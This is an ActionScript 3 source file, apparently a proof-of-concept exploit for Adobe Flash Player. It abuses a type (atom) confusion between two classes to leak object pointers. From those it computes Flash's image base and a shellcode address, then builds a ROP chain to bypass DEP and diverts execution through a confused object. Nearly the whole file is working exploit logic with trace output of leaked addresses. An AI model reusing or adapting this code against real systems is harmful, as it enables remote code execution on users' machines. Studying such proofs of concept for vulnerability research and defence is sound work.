package {
	import Original_Class;            //refer to Class "Original_Class"
	import Real_Ref_Class;            //refer to Class "Real_Ref_Class"
	import flash.display.Sprite;
	import flash.utils.ByteArray;
	
	
	public class PoC_Main extends Sprite {

		function get_test1():Real_Ref_Class{      //make true the "Real_Ref_Class will be compiled"
			return null;
	}

		public function PoC_Main(){
			
			//return another "Original_Class" object,calling the 1st funciton
			var ByteArray_Object:uint = Original_Class.shellcode();
			//un-tag the tagged pointer
			var p_ByteArray:uint = ByteArray_Object&0xFFFFFFF8;
			//use string to transfer the address value
			var str_p_ByteArray:String = p_ByteArray.toString();
			//making a Atom Confusion to transfer str to int
			var int_p_ByteArray = Original_Class.static_stToint(str_p_ByteArray);
			//buile the Number object to read the memory
			var num_obj:Number = new Number(int_p_ByteArray);
			
			//print some result
			trace("ByteArray_Object = 0x" + ByteArray_Object.toString(16));
			trace("p_ByteArray = 0x" + p_ByteArray.toString(16));
			trace("num_obe = " + num_obj.toString());
			
			//tranfer flout hex
			var b:ByteArray = new ByteArray();
			b.writeDouble(num_obj);
			
			//get the virtualfunc of ByteArray
            var res:uint;
            res = b[4]*0x1000000 + b[5]*0x10000 + b[6]*0x100 + b[7];
			trace("res = 0x" + res.toString(16));
			//get the imagebase of flash
			//var imageBase:uint = res - 0x00422310 
			//var imageBase:uint = res - 0x00422310 - 0x9B850;
			var imageBase:uint = res - 0x003ed288;
			trace("imagebase = 0x" + imageBase.toString(16));
			
			//get the string address
			var tmpstr:uint = p_ByteArray + 0x28;
			var str_tmpstr = tmpstr.toString();
			var int_str_tmpstr = Original_Class.static_stToint(str_tmpstr);
			num_obj = new Number(int_str_tmpstr);
			b = new ByteArray();
			b.writeDouble(num_obj);
			//var shellcodeaddress:uint;
			//var shellcodeaddress:uint = b[4]*0x1000000 + b[5]*0x10000 + b[6]*0x100 + b[7] + 0x10;
			var shellcodeaddress:uint = b[4]*0x1000000 + b[5]*0x10000 + b[6]*0x100 + b[7];
			trace("shellcodeaddress = 0x" + shellcodeaddress.toString(16));
			//trace("shellcodeaddress = " + shellcodeaddress);
			
			//get the rop address
			//return another "Original_Class" object,calling the 1st funciton
			var rop_ByteArray_Object:uint = Original_Class.ropfordep(imageBase,shellcodeaddress);
			//un-tag the tagged pointer
			var rop_ByteArray:uint = rop_ByteArray_Object&0xFFFFFFF8;
			var ropstr:uint = rop_ByteArray + 0x28;
			var str_ropstr = ropstr.toString();
			var int_str_ropstr = Original_Class.static_stToint(str_ropstr);
			num_obj = new Number(int_str_ropstr);
			b = new ByteArray();
			b.writeDouble(num_obj);
			//var shellcodeaddress:uint;
			//var shellcodeaddress:uint = b[4]*0x1000000 + b[5]*0x10000 + b[6]*0x100 + b[7] + 0x10;
			var ropaddress:uint = b[4]*0x1000000 + b[5]*0x10000 + b[6]*0x100 + b[7];
			trace("ropaddress = 0x" + ropaddress.toString(16));
			
			
			//call the frist function 
			//var ropaddress:uint = 0x44434241;
			//var imageBase:uint = 0x44434241;
			var obj:Original_Class = Original_Class.static_func1(ropaddress,imageBase);
			obj.normal_func1();
	}
	
	
	}
	
}

